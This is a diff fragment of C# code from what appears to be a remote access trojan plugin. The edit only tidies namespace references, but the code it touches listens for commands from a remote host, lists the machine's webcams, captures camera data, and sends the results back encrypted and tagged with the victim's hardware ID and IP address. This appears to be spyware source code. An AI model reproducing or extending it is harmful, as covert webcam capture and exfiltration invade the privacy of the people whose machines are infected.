@@ -22,22 +22,22 @@ namespace Plugin
                 Socket S = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                 IPEndPoint ep = new IPEndPoint(IPAddress.Parse(H.host), H.port);
                 S.Connect(ep);
-                Shared.PacketTypes.PacketType T = (Shared.PacketTypes.PacketType)Param[0];
+                Shared.PacketType T = (Shared.PacketType)Param[0];
                 Data D = new Data();
                 switch (T)
                 {
-                    case Shared.PacketTypes.PacketType.GET_CAMERAS:
+                    case PacketType.GET_CAMERAS:
                         {
                             List<string> CameraList = Functions.GetCameras();
                             D.HWID = HWID;
-                            D.Type = Shared.PacketTypes.PacketType.GET_CAMERAS;
+                            D.Type = PacketType.GET_CAMERAS;
                             D.DataReturn = new object[] { CameraList };
                             D.IP_Origin = BaseIP;
                             await Task.Run(() => Shared.Serializer.SendData(S, Encryption.RSMTool.RSMEncrypt(D.Serialize(), Encoding.Unicode.GetBytes(key))));
                             break;
                         }
 
-                    case Shared.PacketTypes.PacketType.CAPTURE_CAMERA:
+                    case PacketType.CAPTURE_CAMERA:
                         Socket SCam = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                         IPEndPoint epCam = new IPEndPoint(IPAddress.Parse(H.host), H.port);
                         SCam.Connect(epCam);
